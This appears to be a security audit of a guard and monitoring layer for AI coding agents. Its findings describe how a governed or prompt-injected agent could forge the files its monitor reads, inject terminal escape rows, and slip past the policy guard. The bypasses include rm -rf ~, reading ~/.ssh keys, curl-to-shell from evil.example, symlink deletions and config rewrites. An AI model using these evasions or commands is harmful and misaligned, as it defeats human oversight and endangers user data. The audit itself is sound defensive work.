title: Forged summary.json silences the deviation WARN permanently while the receipts line prints ok
description: checkReceipts' spike rule read its 7-day baseline from .ai-engineering/receipts/summary.json — a file any agent inside the governed repo may Write (self-protect.ts:81-88 documents children of .ai-engineering as the session's own material; .gitignore hides the tree from diff review). A single plant — {"daily":{"<ISO day 7-13>":{"runs":0,"denies":1000000}}} — inflates prior7 so last7 <= 3*prior7 can never fire; deleting the file silences the rule by design. Reproduced before the fix: a real 1e6-deny baseline with 4 deny receipts printed `✓ receipts ... (no spike clause)` where the same receipts without the plant printed `▲ ... spike 5 vs 1 ...`.
root_cause: denySpike in src/commands/doctor.ts trusts prior-window numbers parsed from an attacker-writable file, allowing a governed session to permanently disable its own deny-deviation early warning.
intended_behavior: The deviation WARN is the human's aggregate signal that a session is being denied in a storm; the baseline should come from the chain's own append-only receipts (30-day TTL always covers the 14-day window), and absence of history should read as silence, not as an inflatable number.

trace.description: children of .ai-engineering/ (receipts/summary.json) are deliberately session-writable, so a Write of the aggregate is allowed by the chain itself
readFileSync+JSON.parse of the forged summary.json flows prior?.daily into mergeDaily
prior7 is dominated by the planted count; last7 <= 3*prior7 returns null and checkReceipts prints the row with status ok

conditions.description: an agent session inside a governed repo (the exact subject the observability layer watches); possibly prompt-injected

execution.attacker_perspective: a governed agent mid-deny-storm that must keep doctor looking green
instructions: Write (or delete) the one-file aggregate the rule reads.
Run doctor: the receipts row prints ✓ with totals, top and repeats, and no spike clause — the silencing is invisible.
execution.expected_result: ▲ spike clause never appears regardless of how many denies the last week holds; the line reads ✓ ok.

remediation.strategy: Derive the rule's series from the raw receipts only — files the chain itself writes and an agent has no reason or ability to shape in this direction — and treat a young repo (no runs in the prior week) as the honest silent case. Apply a minimum storm size so a single blip (including doctor's own adversarial chain-test deny) cannot out-shout a quiet baseline.

code_changes.fixed_code: const live = summarizeReceipts(dir); ... if (priorRuns === 0) return null; if (last7 < 3 || last7 <= 3 * prior7) return null;

likelihood.reason: one Write call by exactly the subject the layer watches; no special knowledge needed

impact.reason: no verdict changes, but the milestone's stated purpose (catching storms and repeats) is permanently defeated and the defeat is invisible

confidence.reason: pre-fix runtime reproduction on a scratch repo (forged file → ✓ row vs ▲ spike row with identical receipts), post-fix regression test pinned in tests/doctor-command.spec.ts

title: Aggregates are type-unchecked at the sums: forged string denies fabricate spike numbers; hostile n NaN-erases the repeats count
description: denySpike summed `series[day]?.denies ?? 0` with no numeric check: a prior summary with {denies:"999999"} produced `last7 = "0999999"` (string +=), the strict `=== 0` guard missed it, and doctor printed a wholly fabricated `spike 0999999 vs 0 the week before` while flipping its own status to warn — an alarm conjured from nothing. Repeats arithmetic in checkReceipts had the same shape: {"k":{"n":{}}} → NaN → the repeats clause vanished silently even after a real deny campaign; {"k":{"n":"999"}} coerced to a printed 998.
root_cause: mergeDaily and checkReceipts in src/receipts.ts / src/commands/doctor.ts sum values parsed from files without runtime narrowing, allowing hostile types to flow into human-visible arithmetic.
intended_behavior: Every value that reaches the human line is a non-negative finite integer; hostile shapes behave as zero, not as strings or NaN.

trace.description: prior daily points spread in without coercion
last7 += series[day]?.denies ?? 0 string-concatenates a forged "999999"
spike.last7 interpolated into the human row: `spike 0999999 vs 0`

conditions.description: attacker writes summary.json or denies.json (session-writable, see F1 entrypoint)

execution.attacker_perspective: a governed agent that wants the human to distrust the spike line (false alarms) or to see no repeats (hide evidence)
execution.expected_result: a fabricated ▲ spike row with no denies, or the repeats clause silently absent after a real campaign.

remediation.strategy: Coerce at the two trust boundaries: count() in mergeDaily re-emits every point as a finite non-negative whole integer, and checkReceipts coerces each ledger n before subtracting one.

code_changes.fixed_code: const count = (v: unknown): number => (typeof v === "number" && Number.isFinite(v) && v >= 0 ? Math.floor(v) : 0); ... out[day] = { runs: count(point?.runs), denies: count(point?.denies) };
const n = typeof e?.n === "number" && Number.isFinite(e.n) ? Math.floor(e.n) : 0; return sum + Math.max(0, n - 1);

likelihood.reason: one echo of a hostile JSON value

impact.reason: human-facing evidence can lie in both directions; verdicts untouched

confidence.reason: pre-fix runtime proof: fabricated `spike 1999999000 vs 0` observed in the real doctor row; regression now pins both coercions

title: Receipt JSON reaches the terminal unsanitized: newline or ANSI bytes in denied_by/tool forge whole doctor rows including fake check ✓ lines
description: summarizeReceipts used receipt-derived strings (guards.denied_by, tool, surface) as bucket keys and doctor printed the top key into its human row without stripping control characters. A single deny receipt with denied_by "self-protect\n│  ✗ CANARY" produced a second physical output line carrying the tree's own spine glyph — visually a governance row the human trusts; ANSI ESC bytes erase or repaint already-printed rows the same way. The repo already owns the sanitizer for exactly this class: printable() (src/env.ts:155-157, strips every control/format codepoint) — wired in loop.ts's messages since a prior audit, never wired to the new reads. Fixed by applying it at the source (summarizeReceipts) so no consumer must remember it.
root_cause: summarizeReceipts in src/receipts.ts copies attacker-writable key strings verbatim into the aggregate, allowing terminal escape sequences into the human-facing doctor row.
intended_behavior: Keys of the aggregate are printable, bounded text by construction (printable() strips control/format codepoints and caps at 200 chars), so the rendered line cannot create rows or repaint the frame.

trace.description: receipts/*.json are session-writable material by design
per_guard[guard] now printable(denied_by); pre-fix the raw key was stored
detail += ` · top ${topOf(...)}` flows through ui.ts renderRow/log.message, which prefixes every physical line with the spine

conditions.description: governed agent writes one receipt file (chain would also accept it as its own output)

execution.attacker_perspective: an agent whose storm the row is reporting wants to erase or counterfeit the report
instructions: Write the receipt, run doctor, count lines containing the marker.
execution.expected_result: pre-fix: two lines (the receipts row plus a counterfeit spine row). Post-fix: one line, marker collapsed inside the receipts row without the newline.

remediation.strategy: Strip control/format codepoints once at the source (printable() on denied_by/tool/surface in summarizeReceipts), the same boundary the loop guard already uses.

likelihood.reason: one Write with a JSON escape

impact.reason: the human's trust surface — doctor's frame — accepts fabricated rows from inside one JSON file

confidence.reason: runtime repro both directions: pre-fix CANARY row printed as its own spine line; post-fix regression pins exactly one line, inside the receipts row

title: doctor --gc dies permanently on a planted directory named *.json: unguarded unlinkSync before the summary write bricks collection and freezes the baseline
description: The mtime sweep mapped every *.json entry in receipts/ (except summary/denies) through lstat and unlinked stale ones with no try/catch. `mkdir .ai-engineering/receipts/bomb.json; touch -t 202001010000 bomb.json` passes the fence (not terminal, not a literal) and the stale filter, and unlinkSync on a directory throws EPERM all the way out of doctorMain — before the merge+write. Reproduced pre-fix: exit code thrown, no summary.json ever written again for the repo, every future gc attempt dies identically. The non-gc doctor run survives it, so the repo looks healthy while its only memory-rebuilding path is bricked, locking in F1's forged or absent baseline.
root_cause: gcReceipts in src/commands/doctor.ts calls unlinkSync on readdir results without checking they are regular files, allowing a planted directory to throw out of the collection pass.
intended_behavior: A directory inside receipts/ is not a receipt; the sweep leaves it for a human and the gc completes — aggregate, delete stale files, prune the ledger — on every run.

trace.description: mkdir under receipts/ is session-writable material
pre-fix readdir+filter selected bomb.json by mtime with no isFile() check
unlinkSync threw EPERM before writeFileSync of summary.json

conditions.description: agent plants bomb.json directory with an old mtime; every gc attempt repeats the failure

execution.attacker_perspective: an agent that wants long-term collection (and thus F1's honest baseline) dead
instructions: Plant the directory; run gc; observe the throw and the absent summary write.
execution.expected_result: pre-fix: EPERM out of doctorMain({gc:true}), exit 2 from the CLI, gc permanently bricked. post-fix: `✓ receipts: 1 aggregated...`, directory left alone.

remediation.strategy: Sweep regular files only (lstat().isFile()); the planted directory simply stops being gc's problem.

likelihood.reason: needs one mkdir + touch, but no victim action beyond gc ever running

impact.reason: durable DoS of the gc and of the honest-baseline mechanism F1's fix relies on; recovery needs a human

confidence.reason: pre-fix throw reproduced through doctorMain({gc:true}) directly; post-fix regression test asserts no throw, summary written, directory intact, real receipts deleted

title: The deny hot path read+rewrote an attacker-sized ledger with no bound: 16 MB plant measured 49.7-78.5 ms per denial against the repo's own budgets
description: upsertDenyLedger parsed the whole denies.json and re-emitted it verbatim on every guard denial. The file is session-writable; a planted 16 MB/166k-key ledger made every denial in every session of the repo cost ~50-80 ms measured (M1 Mac, best/worst of 10) — at or over the 50 ms p95 ceiling doctor enforces, roughly 10-16x the repo's own measured deny latency (p50 1 ms / p95 5 ms, research/002) and climbing linearly with plant size — and hosts whose dialect contract is fail-open on hook error/timeout (chain/dialect.ts:9-13: Codex, Cursor) turn slow into absent enforcement. The 90-day/ttl prune only ever ran inside manual doctor --gc, and the gc's own prune of the next month depended on gc running at all (see F4).
root_cause: upsertDenyLedger in src/receipts.ts trusts the parsed prior file wholesale, allowing attacker-chosen sizes into the synchronous deny path.
intended_behavior: The ledger is a bounded bell: whatever an adversary plants, the next denial re-emits at most the newest LEDGER_CAP well-formed entries, so the hot path cost is capped by construction.

trace.description: denies.json is session-writable
pre-fix read the full plant and re-stringified every entry
the call sits inside the blocking PreToolUse deny branch

conditions.description: full severity (enforcement loss) only on the fail-open dialects; on blocking hosts it is latency damage

execution.attacker_perspective: an agent that wants the chain slow or, on a fail-open host, absent
payloads: python3 -c 'import json,time; json.dump({f"pad{i}-"+"x"*60:{"n":1,"last_seen":time.strftime("%Y-%m-%dT%H:%M:%S.000Z")} for i in range(160000)}, open(".ai-engineering/receipts/denies.json","w"))'
instructions: Plant the file; trigger any denial; observe latency per denial.
execution.expected_result: pre-fix: every denial pays the plant's parse+rewrite forever. post-fix: the first denial trims to 500 keys and re-emits ~30 KB.

remediation.strategy: Cap the re-emitted ledger at the newest LEDGER_CAP well-formed entries on the hot path itself (shared constant with the gc prune), and coerce n to a finite integer so forged bulk or shapes never survive the round-trip.

code_changes.fixed_code: const fresh = Object.entries(ledger).filter(([, e]) => typeof e?.last_seen === "string" && Number.isFinite(e?.n)).sort((a, b) => (a[1].last_seen < b[1].last_seen ? 1 : -1)).slice(0, LEDGER_CAP); ...

impact.reason: repo-wide deny latency and, on Codex/Cursor dialects, silent chain bypass via host timeout

confidence.reason: measured pre-fix (16 MB → 49.7-78.5 ms/deny best/worst-of-10); regression test asserts the next denial trims an 88 KB plant to ≤ 500 keys

title: Wrap rewrites were stored in the verdict cache as hard denials, so a redelivered wrapped call flipped rewrite to deny
description: runChain cached `{deny:true, by:wrap, message}` for wrap's rewrite-shaped deny before taking the rewriteTo branch. On hosts that redeliver the same physical call (tool_use_id dedup), the second delivery replayed the cached hard denial instead of rewriting again — a plain `bun test` would deny with wrap's reason text, breaking normal work. Pre-existing at the milestone base (dd6cb944), surfaced while this milestone's ledger work traced the same block, and fixed inside it.
root_cause: runChain in src/chain/mod.ts calls rememberVerdict for every deny outcome before checking outcome.rewriteTo, caching a rewrite as a deny.
intended_behavior: Only hard denials enter the cache; a redelivered wrapped call re-runs the guards and rewrites again.

trace.description: second delivery of the same fingerprint reads the cached verdict via cachedVerdict
pre-fix rememberVerdict stored the rewrite outcome as deny:true

conditions.description: host redelivers the same tool_use_id (the dedup case the cache exists for)

execution.attacker_perspective: not an attack — a correctness bug with availability impact on normal wrapped commands
payloads: runChain(bash("bun test", "u1")) twice with identical tool_use_id and session_id
instructions: First delivery rewrites; second delivery (same physical call) must rewrite again.
execution.expected_result: pre-fix: second action === "deny". post-fix: both "rewrite" (pinned in tests/chain-dispatch.spec.ts).

remediation.strategy: Never cache a rewrite: only hard denials are remembered.

code_changes.fixed_code: if (dedup && outcome.rewriteTo === undefined) rememberVerdict(cacheFile, fp, { deny: true, by: row.name, message: outcome.reason });

likelihood.reason: needs a redelivery of a wrapped command — routine for hosts that retry hook deliveries

impact.reason: breaks legitimate test runs with a confusing deny message

confidence.reason: direct two-delivery regression test passes post-fix; pre-fix behavior confirmed by reading the cache shape (no rewrite field exists in Verdict)

title: The 0467 policy matrix allows rm -rf ~ and rm -rf $HOME (bare tilde/$HOME tokens are never classified as paths)
description: scanSegment's token gate (src/guards/policy.ts:274-281) only judges tokens starting /, ./, ../, ~/ or matching the sensitive-path regexes; a bare ~ or $HOME matches none and is dropped, so rm (WRITES) falls through to the workspace-write default at :304 and the matrix allows it. `rm -rf ~` deletes the home directory — .ssh, .aws, dotfiles, user data. The near-spellings prove intent: `rm -rf ~/sub` denies (token ~/ passes the gate), and the pinned test family treats home-as-external-write as the deny class this bypass defeats. Verified by executing runPolicy directly: rm -rf ~ → allow, rm -rf $HOME → allow, rm -rf ~/sub → deny.
root_cause: classifyRequiredMode's token gate in src/guards/policy.ts drops bare ~ and $HOME operands, letting home-wipe commands fall into the workspace-write default.
intended_behavior: Any rm whose target resolves to the user's home is an external write and denies under 0467, in every spelling that expands to home: ~, $HOME, ~/x.

trace.description: policy row runs for Bash with the raw command
token gate: ~ passes no prefix branch and not RE_SENSITIVE_PATH
flags===1 with no path added adds WORKSPACE write; modeAllows("0467","0002") → allow

conditions.description: default policy_mode 0467 (workspace rw+x, external read) — the shipped default

execution.attacker_perspective: prompt-injected agent with one Bash call
instructions: Issue the command once; bash expands ~ before rm sees it.
execution.expected_result: guard allows; the shell deletes the user's home tree.

remediation.strategy: Treat bare ~, $HOME and ${HOME} tokens as home paths at the gate (classify as external/system scope by the same rules ~/x already triggers), and expand $HOME textually before regex tests.

code_changes.fixed_code: const HOME_TOKEN = /^(~|\$\{?HOME\}?|\$\{?home\}?)$/i; // in the token gate: else if (HOME_TOKEN.test(token) || RE_SENSITIVE_PATH.test(token)) → addPath(expandTilde-or-home + remainder)

impact.reason: total loss of the user's home directory; the exact class the matrix exists to deny

confidence.reason: executed directly against runPolicy with the pinned default mode; contrast spellings confirm the deny intent exists and this is a gate hole

title: Unexpanded $-shaped paths fall through to WORKSPACE (or open EXTERNAL read): sensitive-file reads and rm -rf /${x} allowed
description: The classifier is pure text and never expands variables or normalizes. (a) `cat $HOME/.ssh/id_rsa` passes the gate as sensitive but resolvePath (:108-115) cwd-prefixes it to <cwd>/$home/.ssh/id_rsa, where the cwd-prefix arm (:127) reclassifies WORKSPACE read → allow, while `cat ~/.ssh/id_rsa` denies — the deny keys on spelling, not on the file. (b) `rm -rf /${x}` starts with / so it is preserved verbatim, but /$ matches no system/sensitive/external/root-delete regex → defaults to WORKSPACE write (:131) → allow; with x unset bash runs `rm -rf /`. (c) `x=/etc; cat $x/passwd` allows printing /etc/passwd. All executed against runPolicy: allow, while the literal spellings deny.
root_cause: resolvePath in src/guards/policy.ts classifies by lexical prefix against the raw cwd and defaults unmatched paths to WORKSPACE, so any $-shaped spelling escapes every deny regex.
intended_behavior: A path that expands (via $HOME/$x) to a system or sensitive location is classified as that location, or at minimum unmatched paths fail closed rather than landing in the one allowed scope.

trace.description: token gate admits $HOME/.ssh/id_rsa via RE_SENSITIVE_PATH
not /- or ~-prefixed → prefixed with cwd (the early-return at :112 only covers .. paths)
cwd-prefix arm classifies the resolved string WORKSPACE; /$-forms reach the SCOPE_WORKSPACE default at :131

conditions.description: default 0467: workspace rw+x allowed, external read allowed

execution.attacker_perspective: prompt-injected agent wanting key exfiltration or root deletion
instructions: One Bash call each; the last is the fully-expanded absolute spelling — EXTERNAL read is open, so even that leaks.
execution.expected_result: all allow under 0467; the ~/.ssh spelling denies, proving the classification is spelling-based.

remediation.strategy: Expand $HOME/${VAR}/$VAR forms for variables whose assignment the same command text carries, match the sensitive/system regexes against both the raw token and its home-expanded form, and make the unmatched-path default EXTERNAL (or unknown-denied) instead of WORKSPACE.

code_changes.fixed_code: // default branch: :131 → SCOPE_EXTERNAL when the path contains $ or matches no known root; re-test RE_SENSITIVE/RE_SYSTEM after substituting home()

likelihood.reason: single command; the variable forms are one keystroke from the pinned denied ones

impact.reason: SSH/AWS key material exfiltration and, via empty-var root rm, full system wipe

confidence.reason: all four payloads executed directly against runPolicy with observed allow/deny contrasts against pinned test spellings

title: Pipe-to-shell detection requires literal spaced spellings: curl …|sh and bash <(curl …) execute remote code inside 0467
description: NETWORK_EXECUTE (:155-162) matches "| bash", "| sh" (leading space required), "eval ", "source <(", "bash -c $(" — so `curl https://evil.example/i.sh|sh` (no space) and `bash <(curl -s https://evil.example/x)` match none and cost only network-read + workspace-execute → allow. The spaced form `curl … | sh` denies, pinning the intent. The repo already owns a whitespace-tolerant IOC for this exact attack (injection.ts:27 regex `curl [^|\n]*\| *(bash|sh|zsh)` which matches the bypass string) but runInjection applies hit() to fetched/read CONTENT, never to the command text — the detection exists and is wired to the wrong surface. Executed: both bypass forms allow, spaced form denies.
root_cause: NETWORK_EXECUTE in src/guards/policy.ts lists fixed substring arms whose whitespace and spelling assumptions the attacker trivially varies.
intended_behavior: Remote code execution via a fetched script is network-execute and denies under every sane mode; the rule should match the IOC class the injection guard already expresses as a regex.

trace.description: curl <url> admits network read in 0467
no-space pipe and bash <( forms miss all arms
mask charges only network-read → allowed → the shell fetches and executes attacker bytes

conditions.description: 0467 (external read open makes even the curl fetch itself unremarkable)

execution.attacker_perspective: injected agent achieving remote code execution with user privileges
instructions: One Bash call; fetch and execute in one line, exactly the spaced form the guard denies, minus the space.
execution.expected_result: allow → arbitrary code as the user; `curl … | sh` denies, proving intent.

remediation.strategy: Replace the substring arms with a regex mirroring the injection IOC's whitespace tolerance plus process substitution (\|\s*(bash|sh|zsh|python\d?) and (bash|sh|zsh)\s*<\(|source\s+<\(), and wire the same compiled IOC through policy mode for fetch-execute shapes.

code_changes.fixed_code: const RE_PIPE_EXEC = /\|\s*(bash|sh|zsh|python\d?)(\s|$)/i; const RE_PROC_SUBST = /\b(bash|sh|zsh|source)\s*<\s*\(/i; // NETWORK_EXECUTE: arms replaced by RE tests

likelihood.reason: removing one space defeats the arm; process substitution is one keystroke from the covered eval form

impact.reason: arbitrary remote code execution under the user account

confidence.reason: executed against runPolicy; the spaced contrast and injection.ts's existing tolerant regex prove intent and mechanism

title: Classifier never resolves symlinks: ln -s <external> x && rm -rf x/* destroys external trees while both commands classify as pure workspace ops
description: Scope comes from lexical prefix only (:127-131); realpathSync appears solely for the temp-root list (:46). Step 1 `ln -s /Users/<u>/.ssh x` is judged external-read-only (ln is in no deny predicate; the relative link name never reaches addPath) → allow. Step 2 `rm -rf x/*`: the token contains / so it is path-classified, cwd-prefixed → WORKSPACE write → allow. bash expands the glob through the link and rm deletes the real entries. Two individually-innocent commands destroy ~/.ssh (or any user-owned tree via one cheap ln each) while the direct spellings deny.
root_cause: addPath in src/guards/policy.ts derives scope from the un-normalized lexical string, allowing a workspace-named path to act on external targets through a symlink the same session just planted.
intended_behavior: A workspace-relative token whose real target is outside the workspace is charged external/system scope, or symlink-planting commands are themselves denied.

trace.description: the /-prefix gate arm admits ln's absolute target (addPath call :280); bare x never reaches addPath (no /)
x/* prefixed with cwd — lexical, no filesystem check
WORKSPACE write allowed; rm follows the link at execution time

conditions.description: a writable workspace directory to plant the link in (the default 0467 grants exactly that)

execution.attacker_perspective: injected agent destroying the user's key material after P2 already leaked it
instructions: Two commands; each alone classifies inside the mode's grants.

remediation.strategy: realpath the cwd-prefixed candidate when the token is a write/execute path and the file exists, charging its true scope; deny bare `ln -s <absolute-outside-workspace>` into the workspace outright — cheaper and more honest than resolving every tool's view.

code_changes.fixed_code: // in addPath's write branch: try { const real = realpathSync(resolved); scope = classify(real, ...) } catch {} // or: WRITERS-with-external-target for ln/symlink at scanSegment verb level

likelihood.reason: two commands, no special knowledge beyond knowing the guard is lexical

impact.reason: destruction of any user-owned tree outside the repo

confidence.reason: classification of both commands verified by direct runPolicy execution; the bash glob-through-symlink deletion step is inferred from documented rm behavior on symlinks to directories and not executed against the real home

title: self-protect's textual fence is evaded by variable indirection when writing the governed config (f=path; >> $f allows)
description: Pre-existing in the guard subsystem (not introduced by this milestone): writesTo/offendingPath (:126-186) judge the command STRING. `printf x >> .ai-engineering/config.toml` denies; `f=.ai-engineering/config.toml; printf x >> $f`, the && variant, and `export f=...; echo x >> $f` all allow — the protected literal is never spelled at the redirect site. A governed agent that reaches the shell can therefore widen its own policy_mode or edit any non-terminal file directly. Verified end-to-end with runChain: indirect forms → allow, plain redirect and the Write tool → deny.
root_cause: runSelfProtect in src/guards/self-protect.ts matches protected paths against the raw command text, allowing shell variable indirection to hide the target.
intended_behavior: A session inside a governed repo cannot silently rewrite the files the chain reads; a widened config is a human edit with a diff and a PR.

trace.description: redirects and writer verbs collected as text
substring/segment matching on `$f` finds no protected path; policy_mode then re-reads the file per call, so the widening takes effect immediately

conditions.description: governed agent session with Bash (its default state)

execution.attacker_perspective: an agent that wants its destructive matrix widened
instructions: Assign the path to a variable, redirect through it.

remediation.strategy: Track same-command assignments to a variable and test their literal values at every later use site (single-command textual expansion is cheap here); accept that a two-command stateful shell defeats any textual fence, and make the config file's integrity the real backstop: it is git-tracked, and its diff is the permission-change trail the git floor reviews.

code_changes.fixed_code: // writesTo: scan `\w+=([^\s]+)` assignments in the command, substitute $name occurrences with their literal before offendingPath

impact.reason: defeats the guard subsystem's premise silently; the config stays git-visible, which is why this is not high

confidence.reason: all three indirect forms plus the denying control run through the real chain
